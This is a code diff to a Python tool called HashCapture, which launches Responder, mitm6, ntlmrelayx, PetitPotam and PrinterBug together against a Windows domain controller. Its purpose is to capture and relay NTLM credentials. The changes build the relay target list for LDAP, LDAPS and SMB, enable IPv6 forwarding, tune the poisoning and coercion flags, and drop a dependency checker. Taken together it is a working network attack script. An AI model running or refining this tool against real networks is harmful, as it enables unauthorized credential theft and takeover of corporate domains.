@@ -67,6 +67,37 @@ class HashCapture:
         signal.signal(signal.SIGINT, self.signal_handler)
         signal.signal(signal.SIGTERM, self.signal_handler)
 
+    def create_targets_file(self):
+        """Create the targets file for ntlmrelayx"""
+        try:
+            with open("targets.txt", "w") as f:
+                if self.domain:
+                    dc_ip = self.get_dc_ip()
+                    if dc_ip:
+                        f.write(f"ldaps://{dc_ip}\n")
+                        f.write(f"ldap://{dc_ip}\n")
+                        f.write(f"smb://{dc_ip}\n")
+            return True
+        except Exception as e:
+            self.logger.error(f"Failed to create targets file: {e}")
+            return False
+
+    def check_dns_port(self):
+        """Check if port 53 is available"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.bind(('', 53))
+            sock.close()
+            return True
+        except socket.error:
+            self.logger.error("Port 53 is already in use. Please stop any DNS service before running this tool.")
+            try:
+                output = subprocess.check_output("netstat -tulpn | grep :53", shell=True).decode()
+                self.logger.error(f"Process using port 53: {output.strip()}")
+            except:
+                pass
+            return False
+
     def setup_ipv6_forwarding(self):
         """Setup IPv6 forwarding"""
         try:
@@ -86,58 +117,13 @@ class HashCapture:
 
     def restore_ipv6_forwarding(self):
         """Restore original IPv6 forwarding state"""
-        try:
-            if self.original_ipv6_forward is not None:
+        if self.original_ipv6_forward is not None:
+            try:
                 with open('/proc/sys/net/ipv6/conf/all/forwarding', 'w') as f:
                     f.write(self.original_ipv6_forward)
-                self.logger.info("IPv6 forwarding restored to original state")
-        except Exception as e:
-            self.logger.error(f"Failed to restore IPv6 forwarding: {e}")
-
-    def check_dependencies(self):
-        """Check if all required tools and modules are installed and accessible"""
-        missing_tools = []
-        missing_modules = []
-        
-        installation_guide = {
-            "responder": "apt install responder",
-            "ntlmrelayx.py": "pip3 install impacket",
-            "mitm6": "pip3 install mitm6",
-            "netexec": "pip3 install netexec",
-            "nslookup": "apt install dnsutils",
-            "petitpotam.py": "mkdir -p /opt/tools && cd /opt/tools && git clone https://github.com/topotam/PetitPotam.git && ln -s /opt/tools/PetitPotam/PetitPotam.py /usr/local/bin/petitpotam.py && chmod +x /usr/local/bin/petitpotam.py",
-            "printerbug.py": "mkdir -p /opt/tools && cd /opt/tools && git clone https://github.com/dirkjanm/krbrelayx.git && ln -s /opt/tools/krbrelayx/printerbug.py /usr/local/bin/printerbug.py && chmod +x /usr/local/bin/printerbug.py"
-        }
-
-        required_modules = [
-            'netifaces',
-            'ipaddress'
-        ]
-
-        # Check Python modules
-        self.logger.info("Checking required Python modules...")
-        for module in required_modules:
-            try:
-                __import__(module)
-                self.logger.debug(f"Module {module} is installed")
-            except ImportError:
-                missing_modules.append(module)
-                self.logger.error(f"Module {module} is missing")
-
-        # Check command line tools
-        self.logger.info("Checking required command line tools...")
-        for tool in installation_guide.keys():
-            if not shutil.which(tool):
-                missing_tools.append(tool)
-                self.logger.error(f"Tool {tool} is missing")
-            else:
-                self.logger.debug(f"Tool {tool} is installed")
-
-        if len(missing_tools) > 0 or len(missing_modules) > 0:
-            self.logger.error("Missing dependencies. Please install required tools and modules.")
-            return False
-
-        return True
+                self.logger.info("IPv6 forwarding restored")
+            except Exception as e:
+                self.logger.error(f"Failed to restore IPv6 forwarding: {e}")
 
     def get_local_ip(self):
         """Get IP address for specified interface"""
@@ -174,28 +160,10 @@ class HashCapture:
                 if not line and process.poll() is not None:
                     break
                 if line:
-                    # Line is already a string when using universal_newlines=True
-                    logger.info(f"{name}: {line.strip()}")
+                    line_str = line.strip()
+                    logger.info(f"{name}: {line_str}")
         except Exception as e:
             self.logger.error(f"Error processing output for {name}: {e}")
-
-    def cleanup(self):
-        """Clean up running processes and restore system state"""
-        self.logger.info("Cleaning up processes")
-        for name, process in self.processes.items():
-            try:
-                self.logger.info(f"Terminating {name}")
-                process.terminate()
-                try:
-                    process.wait(timeout=5)
-                except subprocess.TimeoutExpired:
-                    process.kill()
-                    process.wait()
-            except Exception as e:
-                self.logger.error(f"Error cleaning up {name}: {e}")
-
-        # Restore IPv6 forwarding
-        self.restore_ipv6_forwarding()
 
     def start_ntlmrelay(self):
         """Start NTLM relay attack"""
@@ -204,15 +172,15 @@ class HashCapture:
                 "ntlmrelayx.py",
                 "-tf", "targets.txt",
                 "-smb2support",
-                "-socks",
+                "-6",  # Enable IPv6
+                "-wh", self.local_ip,
+                "--no-http-server",  # Disable HTTP server
+                "--no-wcf",  # Disable WCF
                 "-debug"
             ]
             
             if self.domain:
-                cmd.extend([
-                    "-domain", self.domain,
-                    "-wh", self.local_ip
-                ])
+                cmd.extend(["-domain", self.domain])
             
             self.logger.info(f"Starting NTLM relay with command: {' '.join(cmd)}")
             process = Popen(
@@ -242,9 +210,8 @@ class HashCapture:
             cmd = [
                 "responder",
                 "-I", self.interface,
-                "-w",  # Enable WinPopup spoofing
-                "-d",  # Enable DHCP spoofing
-                "-v"   # Verbose
+                "-wd",  # Enable WPAD and DNS
+                "-v"    # Verbose
             ]
 
             self.logger.info(f"Starting Responder with command: {' '.join(cmd)}")
@@ -272,7 +239,15 @@ class HashCapture:
     def start_mitm6(self):
         """Start mitm6 attack"""
         try:
-            cmd = ["mitm6", "-i", self.interface, "--no-ra", "-v"]
+            if not self.check_dns_port():
+                return False
+
+            cmd = [
+                "mitm6",
+                "-i", self.interface,
+                "-v",
+                "--debug"
+            ]
             
             if self.domain:
                 cmd.extend(["-d", self.domain])
@@ -308,10 +283,9 @@ class HashCapture:
 
             cmd = [
                 "petitpotam.py",
-                self.local_ip,     # Listener (our machine)
-                self.get_dc_ip(),  # Target (DC)
-                "-d", self.domain,
-                "-u", "anonymous",
+                "-pipe", "efsr",
+                self.local_ip,     # Listener
+                self.get_dc_ip(),  # Target
                 "-no-pass"
             ]
             
@@ -346,7 +320,7 @@ class HashCapture:
 
             cmd = [
                 "printerbug.py",
-                f"{self.domain}/anonymous",
+                f"{self.domain}/",
                 self.get_dc_ip(),
                 "-no-pass"
             ]
@@ -373,21 +347,38 @@ class HashCapture:
             self.logger.error(f"Error in start_printerbug: {e}")
             return False
 
+    def cleanup(self):
+        """Clean up running processes and restore system state"""
+        self.logger.info("Cleaning up processes")
+        for name, process in self.processes.items():
+            try:
+                self.logger.info(f"Terminating {name}")
+                process.terminate()
+                try:
+                    process.wait(timeout=5)
+                except subprocess.TimeoutExpired:
+                    process.kill()
+                    process.wait()
+            except Exception as e:
+                self.logger.error(f"Error cleaning up {name}: {e}")
+
+        # Restore IPv6 forwarding
+        self.restore_ipv6_forwarding()
+
     def run(self):
-        """Main execution flow running all attacks simultaneously"""
+        """Main execution flow"""
         self.logger.info("Starting Hash Capture Operation")
-        
-        # Run dependency checks
-        self.logger.info("Running system and dependency checks...")
-        if not self.check_dependencies():
-            self.logger.error("Dependency checks failed")
+
+        # Create targets file for ntlmrelayx
+        if not self.create_targets_file():
+            self.logger.error("Failed to create targets file")
             return False
 
         # Setup IPv6 forwarding
         if not self.setup_ipv6_forwarding():
             self.logger.error("Failed to setup IPv6 forwarding")
             return False
-        
+
         try:
             # List of attacks to run
             attacks = [
@@ -420,14 +411,13 @@ class HashCapture:
             self.logger.info("Operation interrupted by user")
         except Exception as e:
             self.logger.error(f"Error in main execution: {e}")
-            return False
         finally:
             self.cleanup()
         
         return True
 
 def main():
-    parser = argparse.ArgumentParser(description="Enhanced Hash Capture Tool")
+    parser = argparse.ArgumentParser(description="Hash Capture Tool")
     parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
     parser.add_argument("-d", "--domain", help="Domain name for attacks")
     parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging")
